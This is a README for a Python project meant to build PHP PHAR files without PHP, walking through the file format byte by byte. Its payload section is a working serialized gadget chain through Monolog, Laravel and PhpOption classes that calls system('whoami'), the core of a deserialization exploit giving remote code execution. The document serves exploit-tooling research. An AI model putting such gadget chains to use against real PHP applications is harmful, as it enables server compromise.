# PyGGC

## The end goal
Be able to generate an PHP PHAR file without using PHP.<br>
The `generate.py` script should return the same hashes as the following:
- **SHA512**: df5380de953af92c3ea675dd3041f9e771313a23da02756dd1a04b091483afd1d79eea9b268206c2568130897132f9d48569970a617a911f34b307a79f6c0ada
- **SHA256**: a5d99ebc04e758a44c517cbf167a94d9a8db4fe058069b8e13029bf4330bf46e
- **MD5**: 54703554fe5082629fc7d990689bfefd

## Current problems
- [ ] Why is the file name without extension at the before the signature?
- [ ] From what content is the CRC32 checksum generated?
- [ ] Where does the value `4` bytes come from for un- and compressed file size?
- [ ] Why is the bitmap `A4010000` and not `00000100`?
- [ ] From what data is the SHA1 hash calculated?
- [ ] Why is the payload size and the final file size 1 byte higher than it actually is?

## How are PHAR files made:

### Header
- Header (29): `3C3F706870205F5F48414C545F434F4D50494C455228293B203F3E0D0A` or `<?php __HALT_COMPILER(); ?>\r\n`
- Manifest length (4): `62030000` or `866` == Size of everything below this point without signature

- Number of files (4): `01000000` or `1`
- API version (2): `1100`
- Bitmap flags (4): `00000100` ([0x00010000](https://www.php.net/manual/en/phar.fileformat.flags.php))
- Alias length (4): `00000000` or `0`
- Alias (0): -

### Payload
- Payload length (4): `2C030000` or `812`
- Payload (807): `4F3A33303A224D6F6E6F6C6F675C48616E646C65725C526F6C6C62617248616E646C6572223A323A7B733A34323A22004D6F6E6F6C6F675C48616E646C65725C526F6C6C62617248616E646C65726861735265636F726473223B623A313B733A31363A22002A00726F6C6C6261724C6F67676572223B4F3A36303A22496C6C756D696E6174655C466F756E646174696F6E5C537570706F72745C50726F7669646572735C526F7574655365727669636550726F7669646572223A313A7B733A363A22002A00617070223B4F3A32333A22496C6C756D696E6174655C566965775C466163746F7279223A313A7B733A393A22002A0066696E646572223B4F3A33373A220053796D666F6E795C436F6D706F6E656E745C436F6E736F6C655C4170706C69636174696F6E223A333A7B733A35303A220053796D666F6E795C436F6D706F6E656E745C436F6E736F6C655C4170706C69636174696F6E696E697469616C697A6564223B623A313B733A34373A220053796D666F6E795C436F6D706F6E656E745C436F6E736F6C655C4170706C69636174696F6E636F6D6D616E6473223B613A313A7B693A303B4F3A33333A22496C6C756D696E6174655C466F756E646174696F6E5C416C6961734C6F61646572223A313A7B733A31303A22002A00616C6961736573223B613A313A7B693A303B733A333A226B6579223B7D7D7D733A35323A220053796D666F6E795C436F6D706F6E656E745C436F6E736F6C655C4170706C69636174696F6E636F6D6D616E644C6F61646572223B4F3A32373A22496C6C756D696E6174655C43616368655C5265706F7369746F7279223A313A7B733A383A22002A0073746F7265223B4F3A32303A22005068704F7074696F6E5C4C617A794F7074696F6E223A333A7B733A32383A22005068704F7074696F6E5C4C617A794F7074696F6E6F7074696F6E223B4E3B733A33303A22005068704F7074696F6E5C4C617A794F7074696F6E63616C6C6261636B223B733A363A2273797374656D223B733A33313A22005068704F7074696F6E5C4C617A794F7074696F6E617267756D656E7473223B613A313A7B693A303B733A363A2277686F616D69223B7D7D7D7D7D7D7D`<br>or<br>`O:30:"Monolog\Handler\RollbarHandler":2:{s:42:" Monolog\Handler\RollbarHandlerhasRecords";b:1;s:16:" * rollbarLogger";O:60:"Illuminate\Foundation\Support\Providers\RouteServiceProvider":1:{s:6:" * app";O:23:"Illuminate\View\Factory":1:{s:9:" * finder";O:37:" Symfony\Component\Console\Application":3:{s:50:" Symfony\Component\Console\Applicationinitialized";b:1;s:47:" Symfony\Component\Console\Applicationcommands";a:1:{i:0;O:33:"Illuminate\Foundation\AliasLoader":1:{s:10:" * aliases";a:1:{i:0;s:3:"key";}}}s:52:" Symfony\Component\Console\ApplicationcommandLoader";O:27:"Illuminate\Cache\Repository":1:{s:8:" * store";O:20:" PhpOption\LazyOption":3:{s:28:" PhpOption\LazyOptionoption";N;s:30:" PhpOption\LazyOptioncallback";s:6:"system";s:31:" PhpOption\LazyOptionarguments";a:1:{i:0;s:6:"whoami";}}}}}}}`

### Manifest file entry
[PHP Documentation](https://www.php.net/manual/en/phar.fileformat.manifestfile.php)

- File name length (4): `08000000` or `8`
- File name (8): `746573742E747874` or `test.txt`
- Uncompressed file size (4): `04000000` or `4`
- Unix timestamp (4): `BB565B65` or `1700484795`
- Compressed file size (4): `04000000` or `4`
- CRC32 Checksum (4): `0C7E7FD8`
- Bitmap flags (4): `A4010000`
- File metadata size (4): `00000000`
- File metadata (0): -
- File base name (4): `74657374` or `test`

### Signature
- Signature value (20): `53E24348991F762637117D6481DAC82350F8C644`
- Signature hash (4): `02000000` ([SHA1](https://www.php.net/manual/en/phar.fileformat.signature.php))
- Signature magic number (4): `47424D42` or `GBMB`

## Inspired by
- [PHPGGC](https://github.com/ambionics/phpggc)